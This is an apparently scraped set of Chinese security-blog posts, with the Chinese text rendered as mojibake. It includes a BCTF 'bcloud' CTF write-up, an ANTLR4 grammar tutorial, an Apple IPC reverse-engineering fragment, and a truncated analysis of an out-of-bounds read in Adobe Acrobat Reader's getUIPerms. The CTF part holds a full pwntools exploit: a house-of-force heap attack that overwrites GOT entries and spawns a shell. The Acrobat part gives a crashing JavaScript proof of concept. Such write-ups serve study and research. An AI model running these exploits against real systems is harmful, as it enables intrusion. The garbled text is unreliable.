1234__objc_const:00000001000010B8 _OBJC_INSTANCE_METHODS_VendMe __objc2_meth_list &lt;18h, 1&gt;__objc_const:00000001000010B8 ; DATA XREF: __objc_const:VendMe_$classDataâ†“o__objc_const:00000001000010C0 __objc2_meth &lt;offset sel_foo_, offset aVv2008i16, \\ ; -[VendMe foo:] ...__objc_const:00000001000010C0 offset __VendMe_foo__&gt; ä¾é å¯¹classDataçš„å¼•ç”¨çœ‹ã€‚ å…¶å®ä¹Ÿå¯ä»¥çš„çŸ¥é“äº†DOå¯¹è±¡çš„å¯¹è±¡åä¹‹åç›´æ¥æœå‡½æ•°åˆ—è¡¨ï¼Œæ¯”å¦‚:VendeMe:ã€‚ è¿™ä¸ªæ˜¯åœ¨æœ‰ç¬¦å·çš„æƒ…å†µä¸‹ï¼Œä¸è¿‡ç¬¦å·è¿™ä¸ªçœ‹è¿æ°”äº†ï¼Œä¸ä¸€å®šæœ‰ ç¬¦å·ã€‚ VendeMe:foo 1234void __cdecl -[VendMe foo:](VendMe *self, SEL a2, int a3){ NSLog(CFSTR(&quot;%d&quot;), (unsigned int)a3);} ç”¨æˆ·çš„å‚æ•°ä»a3å¼€å§‹ç®—ã€‚ è¿™ç±»æœåŠ¡æ¼æ´æŒ–æ˜ä¸»åŠ¨fuzzï¼šæ‰¾åˆ°å¤„ç†å‡½æ•°ï¼Œç¡®å®šç±»å‹ï¼Œç„¶åä¸»åŠ¨å†™å®¢æˆ·ç«¯fuzzã€‚ è¢«åŠ¨fuzzï¼šhookå¤„ç†ç‚¹ï¼Œä½†æ˜¯è¦ä¸€ä¸ªä¸€ä¸ªhookï¼Œç„¶åä¿®æ”¹æ•°æ®ã€‚ ä»£ç å®¡è®¡ï¼šæ‰¾å¤„ç†å‡½æ•°ï¼Œäººè‚‰çœ‹é€»è¾‘ã€‚ å¼•ç”¨revisiting-apple-ipc","link":"/2019/08/10/Apple-IPC-DO-Basic/"},{"title":"BCTF--cloud","text":"0x00: ç®€ä»‹æœ€è¿‘åœ¨å¤ç°ä¸€äº›ä¼˜è´¨CTFé‡Œçš„é¢˜ç›®ï¼Œæ‰€ä»¥è¿™ä¸ªç³»åˆ—çš„æ–‡ç« ä¼šæœ‰ç‚¹å¤šâ€¦å…ˆåšäº†ä¸‹BCTFçš„çƒ­èº«é¢˜ç›®â€“bcloudï¼Œä¸€ä¸ªå †ä¸Šçš„åˆ©ç”¨ã€‚ æµ‹è¯•ç¯å¢ƒ:ubuntu 16.04 x64 0x01:ç¨‹åºåˆ†æç¨‹åºæ˜¯ä¸ªèœå•å¼çš„ç¨‹åºï¼Œçœ‹äº†ä¸‹åŠŸèƒ½ï¼Œåº”è¯¥å°±æ˜¯å †ä¸Šçš„ä¸€äº›åˆ©ç”¨äº†ã€‚çœ‹ä¸‹å¼€å¯äº†ä»€ä¹ˆä¿æŠ¤ã€‚ åŸºæœ¬ä¿¡æ¯å°±æ˜¯ä¸Šé¢è¯´çš„é‚£æ ·ï¼Œä¸‹é¢æ˜¯å…·ä½“çš„åˆ†æï¼š åŠŸèƒ½ï¼šæ¯ä¸ªç¬”è®°(chunk)çš„å¤§å°ã€å†…å®¹ã€çŠ¶æ€ä»¥æ•°ç»„å½¢å¼å­˜å‚¨åœ¨.bssæ®µ é—®é¢˜ï¼šbanæ‰äº†showçš„æ“ä½œï¼Œéœ€è¦è‡ªå·±å»æ„é€ ä¸‹æ³„éœ²äº†ã€‚ å…ˆå¼€å§‹çœ‹åœ¨è¿›å…¥èœå•ä¹‹å‰çš„å‡½æ•°:è¿™ä¸ªå‡½æ•°è¯»å…¥ç”¨æˆ·åï¼Œæ²¡çœ‹åˆ°æ˜æ˜¾çš„æº¢å‡ºç‚¹ï¼Œä½†æ˜¯é—®é¢˜åœ¨äº unsafe_read() å‡½æ•°ï¼Œå¦‚æœè¾“å…¥é•¿åº¦ä¸º0x40ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¼•å‘ä¸€ä¸ªå †åœ°å€æ³„éœ²ï¼Œå³åœ¨è¾“å‡ºç”¨æˆ·åçš„æ—¶å€™ï¼Œè¾“å‡ºä¸€ä¸ªå †åœ°å€ã€‚ åœ°å€æ³„éœ² get!ä¸‹é¢æ˜¯è¿™ä¸ªå‡½æ•°ï¼Œè¯»å–host å’Œ orgç„¶åmallocåˆ†é…ç©ºé—´ï¼Œä¹‹åæ‹·è´è¿‡å»ï¼Œç”±äºä½¿ç”¨çš„è¿˜æ˜¯unsafe_read(),æ‰€ä»¥å¯ä»¥æ„é€ ä¸€ä¸ªhofï¼Œè¿™ç§åˆ©ç”¨éœ€è¦å †åœ°å€ï¼Œæ­£å¥½ï¼Œä¹‹å‰æœ‰ä¸ªæ³„éœ²ï¼Œè¿™ä¸‹å°±æ»¡è¶³æ¡ä»¶äº†ã€‚ 0x02:åˆ©ç”¨æ€è·¯é‚£ä¹ˆæ—¢ç„¶ç¡®å®šäº†æ˜¯hofåˆ©ç”¨ï¼Œåˆ©ç”¨çš„æ€è·¯å°±å‡ºæ¥äº†ï¼š åˆ©ç”¨hofçš„æ€è·¯ï¼Œå»åˆ†é…åˆ°.bssä¸Šçš„ 0x0804b0a0 åœ°å€ 12345chunk_length[] ----&gt; 0x0804b0a0...chunk_status[]...chunk_list[] ----&gt; 0x0804B120 åˆ†é…åˆ°ä¹‹åï¼Œåˆ©ç”¨editåŠŸèƒ½å»å¡«å…¥è¦æ”¹å†™çš„å‡½æ•°gotï¼Œå…ˆæ„é€ ä¸€æ¬¡æ³„éœ²ï¼š 1chunk_list[]ä¸­æ”¾ï¼šatoi@got,free@got,atoi@got ç„¶åä¿®æ”¹free@gotä¸ºprintfå‡½æ•°åœ°å€ï¼Œåˆ©ç”¨deleteåŠŸèƒ½å»æ³„éœ²atoiåœ°å€ã€‚ å¾—åˆ°atoi()åœ°å€ä¹‹åï¼Œåˆ©ç”¨libc.soç¡®å®šsystem()å’Œatoi()çš„åç§»ã€‚ ä¿®æ”¹atoi()åœ°å€ä¸ºsystem()ï¼Œä¹‹åéšä¾¿ç”¨ä¸‹èœå•çš„åŠŸèƒ½ï¼Œå‘é€ä¸€ä¸ª/bin/sh\\0è¿‡å»å°±getshelläº†ã€‚ 0x03:exploit12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#!/usr/bin/env python# coding=utf-8# by muhefrom pwn import *context.log_level = 'debug'name_addr = 0x0804B0CCbss_addr = 0x0804b0a0atoi = 0x0804b03cfree = 0x0804b014printf_plt = 0x080484D0'''chunk_length[] ----&gt; 0x0804b0a0chunk_status[]chunk_list[] ----&gt; 0x0804B120'''target = \"./bcloud\"#target = ('127.0.0.1',10001)p = process(target)#p = context(target)def new_note(p,length,content): p.recvuntil('option---&gt;&gt;') p.sendline('1') p.recvuntil('content:') p.sendline(str(length)) p.recvuntil('content:') p.sendline(str(content))def edit_note(p,index,new_content): p.recvuntil('option---&gt;&gt;') p.sendline('3') p.recvuntil('id:') p.sendline(str(index)) p.recvuntil('content:') p.sendline(str(new_content))def delete_note(p,index): p.recvuntil('option---&gt;&gt;') p.sendline('4') p.recvuntil('id:') p.sendline(str(index))def main(): # leak heap address name = \"A\"*60+\"BBBB\" p.send(name) p.recvuntil('BBBB') leak = u32(p.recv(4)) print hex(leak) # hof here usr_host = \"B\"*0x40 fuck_top_chunk = \"\\xff\\xff\\xff\\xff\" p.send(usr_host) p.sendline(fuck_top_chunk) # get list_length chunk.. size = (bss_addr-0x8)-leak-0x8 - 208 new_note(p,size,'AAAA') p.recvuntil('option---&gt;&gt;') p.sendline('1') p.recvuntil('content:') p.sendline('172') #fill the list_length[] &amp;&amp; list_content[] payload = p32(4) payload += p32(4) payload += p32(4) payload += p32(0) * 29 payload += p32(atoi) payload += p32(free) payload += p32(atoi) payload += p32(0) * 8 p.send(payload) # change free() to printf() raw_input('$debug...') p.sendline('3') p.sendline('1') p.send(p32(printf_plt)) # leak addr of atoi() delete_note(p,0) garbage = p.recvuntil(\"Input the id:\\n\") leak_atoi = u32(p.recv(4)) print \"got atoi() ----&gt;\"+hex(leak_atoi) # get system() addr system_addr = leak_atoi + 0xd8f0 # overwrite atoi() to system() &amp;&amp; getshell p.sendline('3') p.sendline('2') p.send(p32(system_addr)) garbage = p.recv() p.sendline(\"/bin/sh\\x00\") p.interactive()if __name__ == '__main__': main() getshell~~ 0x04:å‚è€ƒuaf.io","link":"/2016/09/27/BCTF-cloud/"},{"title":"Antlr4åˆä½“éªŒ","text":"0x00ï¼šä»‹ç»Antlr 4 æ˜¯ä¸€ä¸ªå¼ºå¤§çš„è¯­æ³•åˆ†æå™¨ç”Ÿæˆå·¥å…·ï¼Œå¯ä»¥ç”¨æ¥è¯»å–ã€å¤„ç†ã€æ‰§è¡Œå’Œè½¬æ¢ç»“æ„åŒ–æ–‡æœ¬æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ã€‚é€šè¿‡ç§°ä¸ºæ–‡æ³•çš„å½¢å¼åŒ–è¯­è¨€æè¿°ï¼ŒANTLRå¯ä»¥ä¸ºè¯¥è¯­è¨€è‡ªåŠ¨ç”Ÿæˆè¯æ³•åˆ†æå™¨ã€‚ç”Ÿæˆçš„è¯­æ³•åˆ†æå™¨å¯ä»¥è‡ªåŠ¨æ„å»ºè¯­æ³•åˆ†ææ ‘ï¼Œå®ƒæ˜¯è¡¨ç¤ºæ–‡æ³•å¦‚ä½•åŒ¹é…è¾“å…¥çš„æ•°æ®ç»“æ„ã€‚ANTLRè¿˜å¯ä»¥è‡ªåŠ¨ç”Ÿæˆæ ‘éå†å™¨ï¼Œç”¨æ¥è®¿é—®æ ‘èŠ‚ç‚¹ä»¥æ‰§è¡Œç‰¹å®šçš„ä»£ç ã€‚ 0x01: why thisï¼Ÿæˆ‘ä¸€ç›´è§‰å¾—ç¼–è¯‘åŸç†ç›¸å…³çš„ä¸œè¥¿ï¼ˆç†è®ºä¹Ÿå¥½ï¼Œå·¥å…·ä¹Ÿå¥½ï¼‰å¯ä»¥å’Œæ¼æ´æŒ–æ˜å‘ç”Ÿå¥‡å¦™çš„åŒ–å­¦ååº”ã€‚å’Œ9kå¸ˆå‚…èŠè¿‡ç›¸å…³çš„ä¸œè¥¿ï¼Œæœ‰ç±»ä¼¼æƒ³æ³•çš„äººå¾ˆå¤šã€‚ç”šè‡³githubä¸Šå…­å¹´å‰çš„ä¸€ä¸ªé¡¹ç›®ï¼Œä½¿ç”¨flex+bisonå»ç”Ÿæˆæ–‡ä»¶æ¥åšfuzzã€‚ å’Œflex+bisonæ¯”è¾ƒï¼Œantlr4æ— ç–‘æ˜¯æ›´å®¹æ˜“ä¸Šæ‰‹ï¼Œä¹Ÿæ›´åŠ å¼ºå¤§çš„ï¼Œå½“ç„¶ç”¨å“ªä¸ªå°±æ˜¯ä»è€…è§ä»æ™ºè€…è§æ™ºäº†ã€‚ åœ¨æ·±å…¥å­¦ä¹ è¿™äº›ä¸œè¥¿ä¹‹åï¼Œå¯¹domatoçš„æ€æƒ³æœ‰äº†æ›´æ·±åˆ»çš„ç†è§£ã€‚å…¶å®å°±æ˜¯è¯æ³•åˆ†æé‚£å¥—ï¼Œè‡ªé¡¶å‘ä¸‹çš„ã€‚ä¸å¾—ä¸è¯´ï¼ŒçœŸçš„å¾ˆæ£’ï¼Œè€Œä¸”åº”ç”¨èŒƒå›´å¾ˆå¹¿æ³›ï¼Œä½†æ˜¯æ•ˆæœæ€ä¹ˆæ ·æˆ‘å°±ä¸çŸ¥é“äº†ï¼Œè¿˜åœ¨æ‘¸ç´¢ã€‚ 0x02ï¼š å…³äºæœ¬æ–‡ã€ŠAntlr4æƒå¨æŒ‡å—ã€‹ä¸­8.4ç« èŠ‚ç»ƒä¹ çš„å­¦ä¹ è®°å½•ã€‚è¿™éƒ¨åˆ†çš„ä¾‹å­æ˜¯ä¸€ä¸ªè¯­æ³•æ£€æŸ¥å™¨ï¼Œé’ˆå¯¹Cymbolè¯­è¨€çš„ã€‚ æ¯”å¦‚ä¸‹é¢çš„ä»£ç ï¼š 1234567891011121314151617int f(int x, float y) { g(); // forward reference is ok i = 3; // no declaration for i (error) g = 4; // g is not variable (error) return x + y; // x, y are defined, so no problem}void g() { int x = 0; float y; y = 9; // y is defined f(); // backward reference is ok z(); // no such function (error) y(); // y is not function (error) x = f; // f is not a variable (error)} ç»è¿‡è¯¥è¯­æ³•æ£€æŸ¥å™¨ï¼Œå¯ä»¥å°†ä¸€äº›è¯­æ³•é”™è¯¯æ‰¾å‡ºæ¥ï¼Œæ¯”å¦‚æœªå®šä¹‰çš„ç¬¦å·ã€ç±»å‹å¼•ç”¨é”™è¯¯(å‡½æ•°å½“å˜é‡ï¼Œå˜é‡å½“å‡½æ•°)ã€‚ 0x03: ä¾‹å­1. è¯­æ³•åˆ†æ12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/** Simple statically-typed programming language with functions and variables * taken from &quot;Language Implementation Patterns&quot; book. */grammar Cymbol;file: (functionDecl | varDecl)+ ;varDecl : type ID ('=' expr)? ';' ;type: 'float' | 'int' | 'void' ; // user-defined typesfunctionDecl : type ID '(' formalParameters? ')' block // &quot;void f(int x) {...}&quot; ;formalParameters : formalParameter (',' formalParameter)* ;formalParameter : type ID ;block: '{' stat* '}' ; // possibly empty statement blockstat: block | varDecl | 'if' expr 'then' stat ('else' stat)? | 'return' expr? ';' | expr '=' expr ';' // assignment | expr ';' // func call ;/* expr below becomes the following non-left recursive rule:expr[int _p] : ( '-' expr[6] | '!' expr[5] | ID | INT | '(' expr ')' ) ( {8 &gt;= $_p}? '*' expr[9] | {7 &gt;= $_p}? ('+'|'-') expr[8] | {4 &gt;= $_p}? '==' expr[5] | {10 &gt;= $_p}? '[' expr ']' | {9 &gt;= $_p}? '(' exprList? ')' )* ;*/expr: ID '(' exprList? ')' # Call | expr '[' expr ']' # Index | '-' expr # Negate | '!' expr # Not | expr '*' expr # Mult | expr ('+'|'-') expr # AddSub | expr '==' expr # Equal | ID # Var | INT # Int | '(' expr ')' # Parens ;exprList : expr (',' expr)* ; // arg listK_FLOAT : 'float';K_INT : 'int';K_VOID : 'void';ID : LETTER (LETTER | [0-9])* ;fragmentLETTER : [a-zA-Z] ;INT : [0-9]+ ;WS : [ \\t\\n\\r]+ -&gt; skip ;SL_COMMENT : '//' .*? '\\n' -&gt; skip ; 2. ç¬¦å·è¡¨è¿™éƒ¨åˆ†æ˜¯ç²¾é«“ï¼Œä½œè€…ç›´æ¥æ‹¿äº†è‡ªå·±å¦ä¸€æœ¬ä¹¦é‡Œçš„ä»£ç æ¥ç”¨ï¼Œä»£ç ä¸é•¿ä¹Ÿå¥½æ‡‚ã€‚è¿™é‡Œæˆ‘åªåˆ—ä¸€éƒ¨åˆ†æ¯”è¾ƒé‡è¦çš„ï¼š 1234567891011121314151617181920212223242526public abstract class BaseScope implements Scope { Scope enclosingScope; // ä¸´è¿‘çš„ä½œç”¨åŒºï¼Œå¦‚æœå½“å‰æ˜¯å…¨å±€ä½œç”¨åŸŸï¼Œåº”è¯¥ç½®null // å› ä¸ºä½œç”¨åŸŸæŸ¥æ‰¾æ˜¯å¾€å‰æ‰¾çš„ï¼Œå…¨å±€å·²ç»æ˜¯æœ€é å‰äº† Map&lt;String, Symbol&gt; symbols = new LinkedHashMap&lt;String, Symbol&gt;(); public BaseScope(Scope enclosingScope) { this.enclosingScope = enclosingScope; } public Symbol resolve(String name) { Symbol s = symbols.get(name); if ( s!=null ) return s;//åœ¨å½“å‰ä½œç”¨åŸŸæ‰¾åˆ°äº†ï¼Œç›´æ¥è¿”å› //å¦‚æœä¸´è¿‘ä½œç”¨åŸŸä¸ç©ºï¼Œé‚£ä¹ˆå°±å»ä¸´è¿‘ä½œç”¨åŸŸæ‰¾ //æ¯”å¦‚ï¼Œä¸€ä¸ªå‡½æ•°å†…ï¼Œç¬¦å·å®šä¹‰æ²¡æ‰¾åˆ°ï¼Œå°±å»å¾€ä¸Šï¼ˆå…¨å±€ï¼‰æ‰¾ if ( enclosingScope != null ) return enclosingScope.resolve(name); //è¿˜æ‰¾ä¸åˆ°ï¼Œé‚£å°±æ˜¯æœªå®šä¹‰ï¼ŒæŠ¥é”™ return null; // not found } public void define(Symbol sym) { symbols.put(sym.name, sym); sym.scope = this; // track the scope in each symbol } public Scope getEnclosingScope() { return enclosingScope; } public String toString() { return getScopeName()+&quot;:&quot;+symbols.keySet().toString(); }} 3. å¦‚ä½•æ£€æŸ¥å› ä¸ºç›®æ ‡è¯­è¨€Cymbolå…è®¸å‘å‰å¼•ç”¨ï¼Œæ¯”å¦‚ï¼š 12345678int f(){ g();}void g(){ ;} æ‰€ä»¥éœ€è¦ä¸¤æ¬¡éå†ï¼Œç¬¬ä¸€æ¬¡æ‰¾åˆ°æ‰€æœ‰å®šä¹‰ï¼Œå¹¶æ”¾å…¥ç¬¦å·è¡¨ï¼Œå°†ç¬¦å·è¡¨æ„é€ å¥½ã€‚æ¥ä¸‹æ¥è¿›è¡Œç¬¬äºŒæ¬¡éå†ï¼Œè¿™æ—¶é‡åˆ°ä¸€ä¸ªå¼•ç”¨ï¼Œå°±å»æ‰¾ç¬¦å·è¡¨ï¼Œæ‰¾åˆ°äº†å°±æ˜¯æ­£å¸¸ï¼Œæ‰¾ä¸åˆ°å°±æ˜¯æœ‰é—®é¢˜ã€‚ 4. ä»£ç ä¸»è¦æ˜¯ä¸¤ä¸ªæ–‡ä»¶ï¼ŒDefPhase.javaå’ŒRefPhase.javaã€‚ 1. Defphaseå…³é”®çš„é—®é¢˜ï¼šåœ¨ç¬¬ä¸€æ¬¡éå†æ„é€ ç¬¦å·è¡¨çš„æ—¶å€™ï¼Œé‡åˆ°æ–°çš„ä½œç”¨åŸŸï¼Œéœ€è¦æŠŠæ–°çš„ä½œç”¨åŸŸçš„çˆ¶ä½œç”¨åŸŸè®¾ç½®ä¸ºå½“å‰ä½œç”¨åŸŸï¼Œå¹¶ä¸”æŠŠæ–°çš„ä½œç”¨åŸŸè®¾ç½®ä¸ºå½“å‰ä½œç”¨åŸŸã€‚ å¯¹äºé‡åˆ°çš„å˜é‡å®šä¹‰ç›´æ¥ä½¿ç”¨å¯¹åº”çš„æ„é€ ç¬¦å·è¡¨çš„å¯¹è±¡å»æ„é€ å°±å¥½äº†ã€‚ 2. RefPhaseéå†æ£€æŸ¥æ¯ä¸ªå¼•ç”¨éƒ¨åˆ†ï¼Œå»ç¬¦å·è¡¨é‡ŒæŸ¥æ‰¾ï¼Œæ‰¾ä¸åˆ°å°±æŠ¥é”™ã€‚è¿™éƒ¨åˆ†æ¯”è¾ƒç®€å•ã€‚ 3. checkSymbol1234567891011parser.setBuildParseTree(true);ParseTree tree = parser.file();// show tree in text form//System.out.println(tree.toStringTree(parser));ParseTreeWalker walker = new ParseTreeWalker();DefPhase def = new DefPhase();walker.walk(def, tree);// create next phase and feed symbol table info from def to ref phaseRefPhase ref = new RefPhase(def.globals, def.scopes);walker.walk(ref, tree); 5. ç»“æœ1234567891011121314151617181920212223242526272829# muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:46]$ antlr4 Cymbol.g4# muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:49]$ javac Cymbol*.java CheckSymbols.java *Phase.java *Scope.java *Symbol.java -Xlint:deprecationCheckSymbols.java:9: è­¦å‘Š: [deprecation] org.antlr.v4.runtimeä¸­çš„ANTLRInputStreamå·²è¿‡æ—¶import org.antlr.v4.runtime.ANTLRInputStream; ^CheckSymbols.java:40: è­¦å‘Š: [deprecation] org.antlr.v4.runtimeä¸­çš„ANTLRInputStreamå·²è¿‡æ—¶ ANTLRInputStream input = new ANTLRInputStream(is); ^CheckSymbols.java:40: è­¦å‘Š: [deprecation] org.antlr.v4.runtimeä¸­çš„ANTLRInputStreamå·²è¿‡æ—¶ ANTLRInputStream input = new ANTLRInputStream(is); ^3 ä¸ªè­¦å‘Š# muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:56]$ java CheckSymbols vars.cymbollocals:[]function&lt;f:tINT&gt;:[&lt;x:tINT&gt;, &lt;y:tFLOAT&gt;]locals:[x, y]function&lt;g:tVOID&gt;:[]globals:[f, g]line 3:4 no such variable: iline 4:4 g is not a variableline 13:4 no such function: zline 14:4 y is not a functionline 15:8 f is not a variable 0x04ï¼š å¼•ç”¨ã€Šantlr4æƒå¨æŒ‡å—ã€‹","link":"/2018/05/29/Antlr4%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"title":"Adobe Acrobat Reader getUIPerms&#x2F;setUIPerms  Unicode String Out-of-bound Read","text":"Unicode String Out-of-bound Read8æœˆè¡¥ä¸è¢«xlabæ’äº†ï¼Œç´¢æ€§å°±æ”¾å‡ºæ¥äº†ã€‚ [TOC] 0x00 : PoCdocå¯¹è±¡çš„getUIPermså‡½æ•°çš„è¶Šç•Œè¯» 1app.doc.getUIPerms({cFeatureName:\"\\xFE\\xFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"}) å…¶å®setUIPermsä¹Ÿèƒ½è§¦å‘ï¼Œä½†æ˜¯å‚æ•°å’Œè¿™ä¸ªgetUIPermsä¸å¤ªä¸€æ ·ï¼Œä½†æ˜¯æ ¸å¿ƒé—®é¢˜éƒ½æ˜¯ä¸€æ ·çš„ã€‚ 0x01 : Crash log1234567891011121314151617181920212223242526272829303132333435363738394041424344450:000&gt; g(2a70.388): Access violation - code c0000005 (!!! second chance !!!)eax=32d7cf00 ebx=0098cbd0 ecx=00000000 edx=32d7d000 esi=00000068 edi=7fffffffeip=59ca7675 esp=0098ca98 ebp=0098caa4 iopl=0 nv up ei ng nz ac pe cycs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010297EScript!mozilla::HashBytes+0x47e7f:59ca7675 8a02 mov al,byte ptr [edx] ds:002b:32d7d000=??0:000&gt; k10 # ChildEBP RetAddr WARNING: Stack unwind information not available. Following frames may be wrong.00 0098caa4 59c52b96 EScript!mozilla::HashBytes+0x47e7f01 0098cab8 59c545c4 EScript!PlugInMain+0x111902 0098cad8 59c54331 EScript!PlugInMain+0x2b4703 0098cb0c 59ca76d5 EScript!PlugInMain+0x28b404 0098cb24 59ca29f4 EScript!mozilla::HashBytes+0x47edf05 0098cb9c 59c93bb3 EScript!mozilla::HashBytes+0x431fe06 0098cbec 59c93912 EScript!mozilla::HashBytes+0x343bd07 0098cc64 59ca1f86 EScript!mozilla::HashBytes+0x3411c08 0098cce0 59c86d06 EScript!mozilla::HashBytes+0x4279009 0098cd54 59c8175d EScript!mozilla::HashBytes+0x275100a 0098d210 59c80606 EScript!mozilla::HashBytes+0x21f670b 0098d250 59c80517 EScript!mozilla::HashBytes+0x20e100c 0098d28c 59c80460 EScript!mozilla::HashBytes+0x20d210d 0098d2bc 59c68ec3 EScript!mozilla::HashBytes+0x20c6a0e 0098d304 59ca87ac EScript!mozilla::HashBytes+0x96cd0f 0098d380 59ca84ec EScript!mozilla::HashBytes+0x48fb60:000&gt; dd edx-1032d7cff0 41414141 41414141 41414141 d000414132d7d000 ???????? ???????? ???????? ????????32d7d010 ???????? ???????? ???????? ????????32d7d020 ???????? ???????? ???????? ????????32d7d030 ???????? ???????? ???????? ????????32d7d040 ???????? ???????? ???????? ????????32d7d050 ???????? ???????? ???????? ????????32d7d060 ???????? ???????? ???????? ????????0:000&gt; dd edx-0x8032d7cf80 00000067 00001000 00000000 0000000032d7cf90 0475f34c dcbabbbb 4141fffe 4141414132d7cfa0 41414141 41414141 41414141 4141414132d7cfb0 41414141 41414141 41414141 4141414132d7cfc0 41414141 41414141 41414141 4141414132d7cfd0 41414141 41414141 41414141 4141414132d7cfe0 41414141 41414141 41414141 4141414132d7cff0 41414141 41414141 41414141 d0004141 å‚æ•°æ˜¯ \\xFE\\xFF\\x41414141..... edxæŒ‡å‘å‚æ•° 0x02 : Analysisè¯»unicodeå­—ç¬¦ä¸²å‡½æ•°ï¼Œæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œåº”è¯¥æ˜¯ä¸Šå±‚é€»è¾‘çš„é—®é¢˜ï¼Œæ²¡æœ‰åšå……åˆ†çš„åˆ¤æ–­ï¼Œå¯¼è‡´ç”¨è¯»unicode stringçš„é€»è¾‘å»è¯»å–äº†ascii string ã€‚ è¿™å°±å¯¼è‡´ï¼Œè¯»å–äº†æ›´å¤šçš„æ•°æ®ï¼Œç„¶åå°±oobäº†ã€‚ 12345678910unsigned int __cdecl sub_23802B75(char *a1, unsigned int a2, void (__cdecl *a3)(const wchar_t *, const wchar_t *, const wchar_t *, unsigned int, uintptr_t)){ unsigned int result; // eax if ( a1 &amp;&amp; *a1 == 0xFEu &amp;&amp; a1[1] == 0xFFu ) result = sub_2385763B(a1, a2, a3); // unicode else result = sub_23802BA9(a1, a2, a3); // ascii string return result;} è°ƒè¯•ï¼Œæ¼æ´å‘ç”Ÿæ—¶å‚æ•°ä¿¡æ¯å¦‚ä¸‹ï¼š å¯ä»¥çœ‹åˆ°ï¼Œä¼ å…¥çš„å‚æ•°å¹¶ä¸æ˜¯unicode stringï¼Œä½†æ˜¯å´æŒ‰ç…§unicode stringçš„ä»£ç é€»è¾‘å»è¯»ï¼Œæ‰€ä»¥å°±è¶Šç•Œäº†ã€‚ ä¸Šä¸€å±‚é€»è¾‘ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°ï¼Œå¯¹äºè¯»å–å­—ç¬¦ä¸²çš„é€»è¾‘æ¥è¯´ï¼Œåªç®€å•çš„æ£€æŸ¥äº†ï¼š å­—ç¬¦ä¸²æ˜¯å¦æœ‰æ•ˆ å­—ç¬¦ä¸²å¼€å¤´æ˜¯å¦æ˜¯\\xFE\\xFF æ»¡è¶³2ï¼Œå°±èµ°unicodeé€»è¾‘ ä¸æ»¡è¶³å°±èµ°asciié€»è¾‘ ä½†æ˜¯è¿™é‡Œåº”è¯¥ä¸æ˜¯root causeï¼Œè€Œä¸”è¿™éƒ¨åˆ†åº•å±‚é€»è¾‘ä¹Ÿæ²¡å•¥é—®é¢˜ï¼Œåº”è¯¥æ˜¯ä¸Šå±‚çš„é€»è¾‘å‡ºäº†é—®é¢˜ï¼Œå¯¼è‡´ä¸‹å±‚ä»£ç æ‰§è¡Œæ—¶å€™å´©æºƒã€‚ é—®é¢˜å‡ºåœ¨ app.doc.getUIPerms() å‡½æ•°å®ç°ï¼Œåœ¨å‚æ•°ä¼ é€’çš„æ—¶å€™ï¼Œå‚æ•°å¤„ç†è€ƒè™‘ä¸å‘¨å¯¼è‡´ã€‚ éœ€è¦æ‰¾è¿™ä¸ªå¯¹è±¡æ³¨å†Œæ–¹æ³•çš„åœ°æ–¹ï¼Œæ‰¾äº†ä¸€åœˆï¼Œå‘ç°è¿™ä¸ªæ–¹æ³•çš„å®ç°åœ¨DigSig.apiä¸­ã€‚ 12340:000&gt; da poi(esp+8)553dfbbc &quot;getUIPerms&quot;0:000&gt; ln poi(esp+c)(55311705) DigSig!PlugInMain+0x48f3a | (55311705) DigSig!PlugInMain ä½†æ˜¯è°ƒè¯•å‘ç°ï¼Œæ ¹æœ¬æ²¡æœ‰è§¦å‘åˆ°è¿™é‡Œçš„ä»£ç é€»è¾‘ã€‚ è¿½è¸ªå †å†…å­˜ 12345678910111213141516171819202122232425262728293031323334353637 address 46df9f98 found in _DPH_HEAP_ROOT @ 5c91000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 471b1820: 46df9f98 67 - 46df9000 2000 5a52abb0 verifier!VerifierDisableFaultInjectionExclusionRange+0x000034c0 7707246b ntdll!RtlDebugAllocateHeap+0x00000039 76fd6dd9 ntdll!RtlpAllocateHeap+0x000000f9 76fd5ec9 ntdll!RtlpAllocateHeapInternal+0x00000179 76fd5d3e ntdll!RtlAllocateHeap+0x0000003e*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Windows\\System32\\ucrtbase.dll - 74840106 ucrtbase!malloc_base+0x00000026 5782a2bc AcroRd32!AXWasInitViaPDFL+0x000008cf 5782e829 AcroRd32!CTJPEGLibInit+0x00002039 542245d8 EScript!PlugInMain+0x00002b5b //this will call alloc func 54224331 EScript!PlugInMain+0x000028b4 542776d5 EScript!mozilla::HashBytes+0x00047edf 542729f4 EScript!mozilla::HashBytes+0x000431fe 54263bb3 EScript!mozilla::HashBytes+0x000343bd 54263912 EScript!mozilla::HashBytes+0x0003411c 54271f86 EScript!mozilla::HashBytes+0x00042790 54256d06 EScript!mozilla::HashBytes+0x00027510 5425175d EScript!mozilla::HashBytes+0x00021f67 54250606 EScript!mozilla::HashBytes+0x00020e10 54250517 EScript!mozilla::HashBytes+0x00020d21 54250460 EScript!mozilla::HashBytes+0x00020c6a 54238ec3 EScript!mozilla::HashBytes+0x000096cd 542787ac EScript!mozilla::HashBytes+0x00048fb6 542784ec EScript!mozilla::HashBytes+0x00048cf6 542780e5 EScript!mozilla::HashBytes+0x000488ef 542770b4 EScript!mozilla::HashBytes+0x000478be 542e85e9 EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x00061731 5803da6f AcroRd32!AIDE::PixelPartInfo::operator=+0x0010536f 57f6723a AcroRd32!AIDE::PixelPartInfo::operator=+0x0002eb3a 57f6345e AcroRd32!AIDE::PixelPartInfo::operator=+0x0002ad5e 57d3002d 